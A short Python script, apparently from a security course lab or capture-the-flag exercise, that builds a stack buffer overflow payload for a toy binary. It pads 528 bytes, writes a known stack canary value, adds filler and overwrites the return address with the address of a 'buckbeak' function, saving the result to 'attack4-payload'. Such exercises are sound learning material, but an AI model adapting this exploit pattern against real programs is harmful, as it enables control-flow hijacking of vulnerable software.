import struct
import sys

# Creating the padding size
padding_size = 528

# Value of the stack_cookie
stack_cookie = 0xDEAD2BAD
# Packing the stack_cookie value
stack_cookie_packed = struct.pack('<I',stack_cookie)

# Address of the buckbeak function
buckbeak_address = 0x5655625d
# Packing the buckbeak function address
buckbeak_address_packed = struct.pack('<I',buckbeak_address)

#----------------------------
# Creating the payload
#----------------------------
# Adding padding to the payload
payload = b'A' * padding_size
# Adding the value of the stack cookie to the payload
payload += stack_cookie_packed
# Adding padding to the payload reach the return address
payload += b'A'* 12
# Writing the address of buckbeak function to the payload
payload += buckbeak_address_packed

# Write into the attack4-payload file
with open("attack4-payload", "wb") as f:
    f.write(payload)


